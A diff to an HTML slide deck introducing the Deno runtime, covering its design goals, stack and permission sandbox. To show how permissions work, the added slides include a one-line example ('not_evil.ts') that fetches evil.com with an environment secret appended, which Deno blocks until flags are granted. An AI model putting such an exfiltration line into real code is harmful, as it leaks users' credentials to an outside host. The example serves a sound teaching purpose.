@@ -9,7 +9,7 @@ pre { margin: 0; white-space: pre-wrap; }
 pre:not([data-visible]) { display: none; }
 a {	color: dodgerblue; }
 
-.color-palette { color: deeppink crimson coral gold khaki grey lightgreen springgreen lightskyblue dodgerblue darkslateblue; }
+.color-palette { color: orchid deeppink crimson coral gold khaki grey lightgreen springgreen lightskyblue dodgerblue darkslateblue; }
 
 </style>
 
@@ -107,11 +107,11 @@ Deno's initial goal:
 <pre>
 <span style="color: dodgerblue"># Intro & History</span>
 
-- <span style="color: lightgreen">Fast I/O</span>      : Should be at least as fast as Node, and it is!
+- <span style="color: lightgreen">Fast I/O</span>:       Should be at least as fast as Node
 - <span style="color: lightgreen">Tight security</span>: Should be secure by default
-- <span style="color: lightgreen">Web compat</span>    : Code written for the browser should "just work"
-- <span style="color: lightgreen">Modern APIs</span>   : Should leverage Promises, TypedArrays, etc.
-- <span style="color: lightgreen">TypeScript</span>    : Should understand and run TypeScript
+- <span style="color: lightgreen">Web compat</span>:     Code written for the browser should "just work"
+- <span style="color: lightgreen">Modern APIs</span>:    Should leverage Promises, TypedArrays, etc.
+- <span style="color: lightgreen">TypeScript</span>:     Should understand and run TypeScript
 - <span style="color: lightgreen">Modern tooling</span>: Should bring a bundler, linter, formatter, etc.
 
 => Modern APIs and TypeScript didn't exist when Node was created
@@ -125,11 +125,12 @@ Deno's initial goal:
 
 <span style="color: lightgreen">> Fast I/O</span>
 
-- Written in <a href="https://www.rust-lang.org/">Rust</a>                        <span style="color: grey">// instead of <a href="https://isocpp.org/">C++</a></span>
+- Written in <a href="https://www.rust-lang.org/">Rust</a>                   <span style="color: grey">// instead of <a href="https://isocpp.org/">C++</a></span>
 - Uses <a href="https://v8.dev/">V8</a> for running JavaScript
-- Uses <a href="https://tokio.rs">Tokio</a> for async I/O <span style="color: grey">            // instead of <a href="https://libuv.org/">libuv</a></span>
-- Uses <a href="https://hyper.rs">hyper</a> for HTTP <span style="color: grey">                // instead of <a href="https://llhttp.org/">llhttp</a></span>
-- <a href="https://deno.land/benchmarks">Benchmarks</a> show it's faster than Node for most workloads
+- Uses <a href="https://tokio.rs">Tokio</a> for async I/O <span style="color: grey">       // instead of <a href="https://libuv.org/">libuv</a></span>
+- Uses <a href="https://hyper.rs">hyper</a> for HTTP <span style="color: grey">           // instead of <a href="https://llhttp.org/">llhttp</a></span>
+
+   <a href="https://deno.land/benchmarks">Benchmarks</a> show it's faster than Node!
 
 <span style="color: grey">// When this talk was first written, <time datetime="2019"></time>,
 // Node was still faster...</span>
@@ -139,6 +140,118 @@ Deno's initial goal:
 <span style="color: dodgerblue"># Deep-Dive & Features</span>
 
 <span style="color: lightgreen">> Tight security</span>
+
+- V8 is already a secure sandbox
+
+<span style="color: grey">// Luckily, JS in the browser can't
+// make syscalls...</span>
+</pre>
+
+<pre>
+<span style="color: dodgerblue"># Deep-Dive & Features</span>
+
+<span style="color: lightgreen">> Tight security</span>
+
+- V8 is already a secure sandbox
+<span style="color: springgreen">+ Node opens up the sandbox and lets
+  a program do whatever</span>
+
+<span style="color: grey">// Steal SSH keys, environment variables,
+// install a trojan, BitCoin miner, etc.
+
+// --> When using Node, as soon as you run
+//     code, it may take over your device...</span>
+</pre>
+
+<pre>
+<span style="color: dodgerblue"># Deep-Dive & Features</span>
+
+<span style="color: lightgreen">> Tight security</span>
+
+- V8 is already a secure sandbox
+<span style="color: springgreen">+ Node opens up the sandbox and lets
+  a program do whatever</span>
+
+<span style="color: grey">// Steal SSH keys, environment variables,
+// install a trojan, BitCoin miner, etc.
+
+// --> When using Node, as soon as you run
+//     code, it may take over your device...</span>
+
+<span style="color: crimson">   --> Thanks to NPM, we're downloading and
+       running tons of potentially malicious
+       code from the internet...</span>
+</pre>
+
+<pre>
+<span style="color: dodgerblue"># Deep-Dive & Features</span>
+
+<span style="color: lightgreen">> Tight security</span>
+
+- V8 is already a secure sandbox
+- Node opens up the sandbox and lets
+  a program do whatever
+<span style="color: springgreen">+ Deno retains the secure sandbox via
+  permissions</span>
+
+<span style="color: grey">// For example:
+//  - Read and write files
+//  - Open sockets
+//  - Read environment variables
+//  - Run subprocesses</span>
+</pre>
+
+<pre>
+<span style="color: dodgerblue"># Deep-Dive & Features</span>
+
+<span style="color: lightgreen">> Tight security</span>
+
+
+<span style="color: grey">// in examples/not_evil.ts</span>
+
+<span style="color: orchid">await</span> <span style="color: khaki">fetch</span>(<span style="color: coral">`https://evil.com/</span><span style="color: dodgerblue">${</span> <span style="color: lightskyblue">Deno</span>.<span style="color: lightgreen">env</span>.<span style="color: khaki">get</span>(<span style="color: coral">"YOUR_SECRET"</span>) <span style="color: dodgerblue">}</span><span style="color: coral">`</span>);
+</pre>
+
+<pre>
+<span style="color: dodgerblue"># Deep-Dive & Features</span>
+
+<span style="color: lightgreen">> Tight security</span>
+
+
+<span style="color: khaki">> deno run examples\not_evil.ts</span>
+
+<span style="color: crimson">error: Uncaught PermissionDenied:</span> Requires env access
+    to "YOUR_SECRET", run again with the --allow-env flag
+
+<span style="color: grey">await fetch(`https://evil.com/${ Deno.env.get("YOUR_SECRET") }`);
+                                          ^
+    at Object.opSync (deno:core/01_core.js:149:12)
+    at Object.getEnv [as get] (deno:runtime/js/30_os.js:63:17)
+    at file:///C:/dev/deno_intro/examples/not_evil.ts:1:43</span>
+</pre>
+
+<pre style="margin-top: -12.5vh;">
+<span style="color: dodgerblue"># Deep-Dive & Features</span>
+
+<span style="color: lightgreen">> Tight security</span>
+
+
+<span style="color: khaki">> deno run
+    <span style="color: orchid">--allow-env=YOUR_SECRET
+    --allow-net=evil.com</span>
+        examples/not_evil.ts</span>
+
+// Granular permissions:
+    <span style="color: grey">--allow-</span>env<span style="color: grey">:    Allow environment access
+    --allow-</span>ffi<span style="color: grey">:    Allow loading dynamic libraries
+    --allow-</span>hrtime<span style="color: grey">: Allow high resolution time measurement
+    --allow-</span>net<span style="color: grey">:    Allow network access
+    --allow-</span>read<span style="color: grey">:   Allow file system read access
+    --allow-</span>run<span style="color: grey">:    Allow running subprocesses
+    --allow-</span>write<span style="color: grey">:  Allow file system write access</span>
+
+// Escape hatch:
+    <span style="color: grey">--allow-</span>all<span style="color: grey">:    Allow all permissions</span>
 </pre>
 
 <pre>
@@ -213,8 +326,8 @@ Deno's initial goal:
 # features
 	# URL imports
 	# security
-		- secure sandbox
-		- but programmer laziness?
+		- programmer laziness?
+        - npm: centralized vulnerability management
 	# deno for web devs
 		- MDN!
 	# integrated dev tooling
@@ -225,14 +338,6 @@ Deno's initial goal:
 	- but backwards
 	- healthy competition -> fetch collab
 	- node + deno = <3
-
-# good use-cases
-	- WebSocket server
-	- HTML rendering -> JSX
-	- Scripting, but with type-safety -> Fast, excellent prototyping
-	- Cross-platform apps: executable bundles, localStorage, FFI, etc.
-	- Libs that need web-compat
-	- Embedded use-cases
 
 # ecosystem
 	- hard to tell
